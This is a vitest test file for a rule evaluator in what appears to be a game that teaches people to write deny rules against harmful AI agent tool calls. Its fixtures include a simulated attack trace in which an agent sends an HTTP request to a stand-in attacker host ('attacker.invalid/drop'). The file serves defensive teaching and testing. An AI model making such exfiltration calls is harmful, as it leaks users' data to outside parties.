import { describe, expect, it } from "vitest";
import { evaluateRules } from "../src/evaluate";
import type { Level, Trace } from "../src/types";

describe("evaluateRules", () => {
  const testLevel: Level = {
    id: "test-level",
    chapter: 1,
    order: 1,
    title: "Test Level",
    story: "Test story",
    learn: "Test learn",
    hints: ["hint 1", "hint 2", "hint 3"],
    tools: [
      {
        name: "read_file",
        tags: ["reads_files"],
        description: "Read a file from disk",
      },
      {
        name: "send_http",
        tags: ["sends_out"],
        description: "Send HTTP request",
      },
    ],
    world: {
      home: "/home/dev",
      projectRoot: "/home/dev/project",
      safeDomains: ["example.test"],
      evilDomains: ["attacker.invalid"],
    },
    sensitivePaths: ["**/secret.txt"],
    mutators: [],
    parRules: 1,
    attack: [
      {
        id: "attack-1",
        steps: [
          {
            kind: "call",
            tool: "send_http",
            args: { url: "https://attacker.invalid/drop" },
            harm: true,
          },
        ],
      },
    ],
    normal: [
      {
        id: "normal-1",
        steps: [
          {
            kind: "call",
            tool: "read_file",
            args: { path: "data.txt" },
            needed: true,
          },
        ],
      },
    ],
  };

  it("returns ok false for malformed rules text", () => {
    const result = evaluateRules(testLevel, "rules: [");
    expect(result.ok).toBe(false);
  });

  it("returns ok true and cleared false when rules list is empty", () => {
    const result = evaluateRules(testLevel, "rules: []");
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.score.cleared).toBe(false);
    }
  });

  it("returns cleared true when a rule denies send_http", () => {
    const yaml = `
rules:
  - name: block-send
    when:
      tool: send_http
    do: deny
`;
    const result = evaluateRules(testLevel, yaml);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.score.cleared).toBe(true);
    }
  });

  it("returns cleared false when a rule denies all calls", () => {
    const yaml = `
rules:
  - name: block-all
    when: {}
    do: deny
`;
    const result = evaluateRules(testLevel, yaml);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.score.cleared).toBe(false);
    }
  });

  it("includes hidden traces in evaluation", () => {
    const hidden: { attack: Trace[]; normal: Trace[] } = {
      attack: [
        {
          id: "hidden-attack",
          steps: [
            {
              kind: "call",
              tool: "send_http",
              args: { url: "https://attacker.invalid/drop" },
              harm: true,
            },
          ],
        },
      ],
      normal: [
        {
          id: "hidden-normal",
          steps: [
            {
              kind: "call",
              tool: "read_file",
              args: { path: "info.txt" },
              needed: true,
            },
          ],
        },
      ],
    };
    const result = evaluateRules(testLevel, "rules: []", hidden);
    expect(result.ok).toBe(true);
    if (result.ok) {
      expect(result.attack.length).toBe(2);
      expect(result.normal.length).toBe(2);
    }
  });
});
